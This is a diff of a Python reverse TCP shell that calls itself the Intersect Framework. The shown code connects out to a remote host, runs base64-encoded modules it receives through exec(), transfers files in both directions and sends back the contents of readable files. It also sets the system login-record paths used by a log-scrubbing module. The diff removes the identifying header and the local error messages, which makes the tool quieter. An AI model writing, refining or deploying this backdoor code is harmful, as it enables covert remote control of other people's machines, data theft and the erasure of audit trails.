@@ -1,14 +1,9 @@
-#!/usr/bin/python
-# Intersect Framework
-# Server-side shell and module handler
-# Reverse TCP
-
+#!/usr/bin/env python
 import os, sys, re, signal
 import socket
 import time
 from subprocess import Popen,PIPE,STDOUT,call
 from base64 import *
-import datetime
 import platform
 import urllib2
 import random, string
@@ -21,23 +16,13 @@ import operator
 import SocketServer, SimpleHTTPServer
 from math import log
 
-
-
 socksize = 4096                            
 activePID = []
-
-now = datetime.datetime.now()
-logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
-
-## Global variables for remote shells are defined during the creation process
-## Variables for Scrub module. Do not change unless you know what you're doing. 
 UTMP_STRUCT_SIZE    = 384
 LASTLOG_STRUCT_SIZE = 292
 UTMP_FILEPATH       = "/var/run/utmp"
 WTMP_FILEPATH       = "/var/log/wtmp"
 LASTLOG_FILEPATH    = "/var/log/lastlog"
-
-    ## Get user and environment information
 distro = os.uname()[1]
 distro2 = platform.linux_distribution()[0]
 Home_Dir = os.environ['HOME']
@@ -49,8 +34,8 @@ else:
     
 
 def module_handler(module, modname):
-    status_msg("\n[+] Module: %s" % modname)
-    status_msg("[+] Start time: %s" % logtime)
+    status_msg("\n[~] Module: %s" % modname)
+    status_msg("[~] Start time: %s" % logtime)
     exec(module)
     connection.send("shell => ")
 
@@ -66,7 +51,7 @@ def log_msg(message):
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send("[+] Contents of %s" % filename)
+        connection.send("[*] Contents of %s" % filename)
         for lines in catfile.readlines():
             connection.sendall(lines)
         catfile.close()
@@ -130,7 +115,6 @@ def main():
         connection.connect((HOST, PORT))
         connection.send("shell => ")
     except:
-        print("[!] Connection error!")
         sys.exit(2)
     
     while True:
@@ -152,7 +136,7 @@ def main():
             newfile.write(filedata)
             newfile.close()
             if os.path.isfile(filename):
-                connection.send("[+] File upload complete!")
+                connection.send("[~] File upload complete!")
             if not os.path.isfile(filename):
                 connection.send("[!] File upload failed! Please try again")
 
@@ -165,7 +149,7 @@ def main():
                 sendfile.close()
                 connection.sendall(filedata)
             else:
-                connection.send("[+] File not found!")
+                connection.send("[!] File not found!")
     
         elif cmd.startswith(":exec"):
             try:
@@ -175,7 +159,6 @@ def main():
                 mod_data = ""                   # Our received file data will go here 
                 data = connection.recv(socksize)
                 mod_data += data
-                #print("[+] Module recieved!")
                 connection.send("Complete")     # sends OK msg to the client
                 modexec = b64decode(mod_data)   # decode the received file
                 module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
@@ -184,7 +167,6 @@ def main():
                 pass
 
         elif cmd == (":quit"):
-            print("[!] Closing server!")
             connection.close()
             os._exit(0)
             sys.exit(0)
